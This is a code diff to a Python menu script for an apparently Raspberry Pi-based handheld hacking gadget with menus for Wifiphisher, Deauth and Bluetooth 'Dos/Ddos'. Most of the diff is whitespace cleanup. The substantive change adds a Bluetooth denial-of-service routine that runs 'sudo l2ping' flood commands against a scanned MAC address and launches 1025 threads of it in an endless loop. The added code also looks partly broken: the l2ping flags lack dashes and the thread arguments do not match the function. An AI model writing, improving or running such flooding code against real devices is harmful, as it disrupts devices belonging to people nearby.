@@ -3,6 +3,7 @@ from PIL import Image, ImageDraw, ImageFont
 import LCD_1in44
 import time
 import os
+import threading
 import subprocess
 import hashlib
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -57,24 +58,26 @@ def prssd_key(a,b):
         if GPIO.input(KEY_PRESS_PIN) == 0:
             break
 
+def DOS(mac):
+    DOS = subprocess.run(["sudo","l2ping", "s", "600", "f", mac])
 
 
 def draw_file_menu(files, selected_index):
     """Draw the file menu on the display in a grid format."""
     draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
-    
+
     # Definire dimensioni della griglia
     num_cols = 3  # Numero di colonne
     num_rows = 4  # Numero di righe
     item_width = width // num_cols
     item_height = 20  # Altezza dell'elemento, puoi modificarlo se necessario
-    
+
     for i, file in enumerate(files):
         col = i % num_cols
         row = i // num_cols
         x = col * item_width
         y = row * item_height
-        
+
         if i == selected_index:
             text_size = draw.textbbox((0, 0), file, font=font)
             text_width = text_size[2] - text_size[0]
@@ -189,7 +192,7 @@ def get_keyboard_input():
             input_text = input_text[:-1]
             draw_keyboard(selected_key_index, input_text, mode, caps_lock)
             time.sleep(0.3)
-        
+
         if GPIO.input(KEY2_PIN) == 0:  # Se KEY2 (P20) è premuto, aggiungi uno spazio
             input_text += ' '
             draw_keyboard(selected_key_index, input_text, mode, caps_lock)
@@ -240,14 +243,16 @@ def draw_menu(selected_index):
     for i, option in enumerate(menu_options):
         y = i * 20  # Spacing between menu items
 
-    	if i == selected_index:
+        if i == selected_index:
             text_size = draw.textbbox((0, 0), option, font=font)
             text_width = text_size[2] - text_size[0]
             text_height = text_size[3] - text_size[1]
             draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))  # Highlight background
-	    draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
+            draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
+
         else:
             draw.text((1, y), option, font=font, fill=(255, 255, 255))  # Text in white
+
     disp.LCD_ShowImage(image, 0, 0)
 
 def show_message(message, duration=2):
@@ -280,7 +285,7 @@ while True:
         selected_index = (selected_index - 1) % len(menu_options)
         draw_menu(selected_index)
         time.sleep(0.3)
-                    
+
     elif GPIO.input(KEY_DOWN_PIN) == 0:
         selected_index = (selected_index + 1) % len(menu_options)
         draw_menu(selected_index)
@@ -293,7 +298,7 @@ while True:
             # Draw and handle the Network sub-menu
             menu_options = ["Wifi", "Deauth", "Firewall"]
             selected_index = 0
- 
+
             # NETWORKS
 
             while True:
@@ -303,7 +308,7 @@ while True:
                     selected_index = (selected_index - 1) % len(menu_options)
                     draw_menu(selected_index)
                     time.sleep(0.3)
-                                
+
                 elif GPIO.input(KEY_DOWN_PIN) == 0:
                     selected_index = (selected_index + 1) % len(menu_options)
                     draw_menu(selected_index)
@@ -312,7 +317,7 @@ while True:
                 elif GPIO.input(KEY_PRESS_PIN) == 0:
                     selected_option = menu_options[selected_index]
 
-                    if selected_option == "Wifi": 
+                    if selected_option == "Wifi":
                         menu_options = ["Pwnagotchi", "Wifiphisher"]
                         selected_index = 0
 
@@ -325,7 +330,7 @@ while True:
                                 selected_index = (selected_index - 1) % len(menu_options)
                                 draw_menu(selected_index)
                                 time.sleep(0.3)
-                                            
+
                             elif GPIO.input(KEY_DOWN_PIN) == 0:
                                 selected_index = (selected_index + 1) % len(menu_options)
                                 draw_menu(selected_index)
@@ -334,15 +339,15 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                if selected_option == "Pwnagotchi": 
+                                if selected_option == "Pwnagotchi":
                                     menu_options = ["Pwnagotchi", "Wifiphisher"]
                                     selected_index = 0
                                     show_message("TEST PASSED")
                                     time.sleep(5)
 
                                     quit()
-        
-        
+
+
         elif selected_option == "Bluetooth":
             # Draw and handle the Network sub-menu
             menu_options = ["Dos", "Ddos"]
@@ -350,14 +355,14 @@ while True:
 
             #
 
-            while True: 
+            while True:
                 draw_menu(selected_index)
-            
+
                 if GPIO.input(KEY_UP_PIN) == 0:
                         selected_index = (selected_index - 1) % len(menu_options)
                         draw_menu(selected_index)
                         time.sleep(0.3)
-                                    
+
                 elif GPIO.input(KEY_DOWN_PIN) == 0:
                     selected_index = (selected_index + 1) % len(menu_options)
                     draw_menu(selected_index)
@@ -367,7 +372,7 @@ while True:
                     selected_option = menu_options[selected_index]
 
                     #Bluetooth Dos
-                    
+
                     if selected_option == "Dos":
 
                         show_message("Wait please . . .")
@@ -377,7 +382,7 @@ while True:
                         ddos().main()       #Scan for mac address
                         for i in ddos_bluetooth.mac_addrs:
                             menu_options.append(i)
-                        
+
                         while True:
                             draw_menu(selected_index)
 
@@ -385,7 +390,7 @@ while True:
                                 selected_index = (selected_index - 1) % len(menu_options)
                                 draw_menu(selected_index)
                                 time.sleep(0.3)
-                                    
+
                             elif GPIO.input(KEY_DOWN_PIN) == 0:
                                 selected_index = (selected_index + 1) % len(menu_options)
                                 draw_menu(selected_index)
@@ -394,10 +399,13 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                try:
-                                    subprocess.run(["sudo","l2ping", "f", selected_option])
-                                except:
-                                    show_message("Error: HOST IS DOWN")
-                                    time.sleep(1)
-                                    break
-            
+                                while True:
+                                    try:
+                                        mac = selected_option
+                                        for i in range(0,1025, 1):
+                                            threading.Thread(target=DOS, args=[str(mac),str("600")]).start()
+
+                                    except:
+                                        show_message("Error: HOST IS DOWN" ,1)
+                                        time.sleep(1)
+                                        break
